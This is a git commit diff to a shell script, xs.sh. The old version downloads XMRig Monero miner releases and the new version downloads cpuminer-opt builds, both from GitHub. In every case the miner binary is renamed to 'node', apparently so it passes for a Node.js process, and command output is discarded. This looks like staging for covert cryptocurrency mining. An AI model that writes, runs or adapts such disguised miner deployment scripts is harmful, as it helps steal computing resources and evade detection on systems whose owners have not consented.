3d602ae2118fa5e89025fe14dc84b896485f4ace
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-17 20:55:15 +0700

    Update xs.sh

--- xs.sh
+++ xs.sh
@@ -1,17 +1,19 @@
-mkdir xmr/freebsd
-wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-freebsd-static-x64.tar.gz > null
-tar -xvf xmrig-6.25.0-freebsd-static-x64.tar.gz
-mv xmrig-6.25.0/xmrig xmr/freebsd/node
-mv xmrig-6.25.0 1
-
-mkdir xmr/jammy
-wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz > nul
-tar -xvf xmrig-6.25.0-jammy-x64.tar.gz
-mv xmrig-6.25.0/xmrig xmr/jammy/node
-mv xmrig-6.25.0 2
-
-mkdir xmr/linux-static
-wget https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz > null
-tar -xvf xmrig-6.25.0-linux-static-x64.tar.gz
-mv xmrig-6.25.0/xmrig xmr/linux-static/node
-mv xmrig-6.25.0 3
+mkdir opt
+wget https://github.com/rplant-pool/cpuminer-rplant/releases/download/5.0.48/cpuminer-opt-linux-5.0.48.tar.gz  > null
+tar -xvf cpuminer-opt-linux-5.0.48.tar.gz
+mkdir opt/avx
+mkdir opt/avx2
+mkdir opt/avx512-sha-vaes
+mkdir opt/ryzen
+mkdir opt/sse2
+mkdir opt/sse2amd
+mkdir opt/sse42
+mkdir opt/sse42-aes
+mv cpuminer-avx opt/avx/node
+mv cpuminer-avx2 opt/avx2/node
+mv cpuminer-avx512-sha-vaes opt/avx512-sha-vaes/node
+mv cpuminer-ryzen opt/ryzen/node
+mv cpuminer-sse2 opt/sse2/node
+mv cpuminer-sse2amd opt/sse2amd/node
+mv cpuminer-sse42 opt/sse42/node
+mv cpuminer-sse42-aes opt/sse42-aes/node
